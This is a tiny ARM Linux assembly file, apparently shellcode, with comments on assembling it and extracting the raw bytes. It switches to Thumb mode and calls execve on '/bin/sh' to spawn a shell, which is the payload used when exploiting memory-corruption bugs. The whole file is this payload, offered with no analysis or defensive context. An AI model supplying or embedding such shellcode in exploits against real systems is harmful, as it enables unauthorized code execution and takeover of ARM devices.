/* arm-linux-gnueabihf-as -o temp.o sc.s */
/* arm-linux-gnueabihf-objcopy -O binary temp.o sc.o */
/* the last null byte can be ignored */

.global _start
_start:
    add r3 , pc, #1
    bx r3
    .code 16
    mov r0, pc
    add r0, #8
    eor r1, r1
    eor r2, r2
    mov r7, #11
    svc 1
execve_addr:
    .ascii "/bin/sh"
